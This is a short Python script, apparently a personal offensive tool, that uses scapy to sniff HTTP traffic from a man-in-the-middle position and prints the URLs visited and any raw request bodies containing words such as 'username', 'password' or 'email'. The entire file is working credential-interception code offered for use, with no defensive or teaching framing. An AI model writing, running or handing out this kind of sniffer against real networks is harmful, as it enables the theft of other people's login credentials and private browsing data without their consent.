#!/usr/bin/env python

# Author: Matthew Zito (goldmund) 
# Contact: https://www.github.com/MatthewZito
# Version: 0.1.0

"""
Presumes controller is MITM. Given a user input
wireless device, this program will sniff HTTP traffic
and output URLs and possible user credentials.
"""
import scapy.all as scapy
from scapy.layers import http

class Sniffer:
    def __init__(self, interface):
        self.interface = interface
        self.sniff(self.interface)

    def get_url(self, packet):
        """
        Pulls and returns all URLs from HTTP given packets.
        """
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def get_credentials(self, packet):
        """
        Pulls and returns all prospective user credentials
        from given HTTP packets.
        """
        if (packet.haslayer(scapy.Raw)):
                load = packet[scapy.Raw].load
                keywords = ["username", "user", "password", "pass", "login", "signup", "email", "credential", "name"]
                for keyword in keywords:
                    if keyword in load:
                        return load

    def process_packet(self, packet):
        if (packet.haslayer(http.HTTPRequest)): 
            url = self.get_url(packet)
            print("[+] HTTP Request")
            print(url + "\n")
            credentials = self.get_credentials(packet)
            if (credentials):
                print("\n[+] Prospective credentials found")
                print(credentials + "\n")
            

    def sniff(self, interface):
        print("[+] Packet sniffing initiated...\n")
        scapy.sniff(iface=interface, store=False, prn=self.process_packet)
